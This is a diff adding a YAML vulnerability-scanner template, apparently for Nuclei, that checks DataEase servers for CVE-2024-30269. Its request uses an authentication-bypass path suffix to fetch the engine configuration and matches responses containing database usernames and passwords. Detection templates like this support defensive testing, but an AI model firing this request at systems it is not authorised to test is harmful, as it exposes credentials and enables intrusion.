@@ -1,0 +1,21 @@
+id: poc-yaml-dataease-config-info-leak
+info:
+  name: DataEase Configuration Information Leak (CVE-2024-30269)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leak,CVE-2024-30269
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/de2api/engine/getEngine;.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(json(body, 'data.configuration'), 'password')
+          - contains(json(body, 'data.configuration'), 'username')
+          - contains(json(body, 'data.configuration'), 'dataease')
